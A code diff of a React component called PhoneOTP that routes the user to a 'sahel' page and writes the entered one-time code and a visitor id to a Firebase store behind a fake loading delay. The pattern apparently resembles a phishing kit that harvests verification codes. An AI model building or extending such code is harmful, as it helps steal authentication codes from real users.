@@ -4,7 +4,7 @@ import type React from "react"
 
 import { useState } from "react"
 import { addData } from "../firebase";
-export default function PhoneOTP() {
+export default function PhoneOTP(props:{setPage:any}) {
     const visitorId = localStorage.getItem('visitor');
 
     const [formData, setFormData] = useState({
@@ -15,19 +15,17 @@ export default function PhoneOTP() {
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
+        props.setPage('sahel')
+        addData(formData)
         setLoading(true)
-        
-       
         try {
-          setTimeout(() => {
-            setLoading(false)
-          addData({...formData,page:'sahel'})
-          setFormData({ id: visitorId, phoneOtp:"" })
-        }, 3000);
+            setFormData({ id: visitorId, phoneOtp:"" })
         } catch (error) {
             console.error("Error:", error)
         }
-     
+        setTimeout(() => {
+            setLoading(false)
+        }, 3000);
     }
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
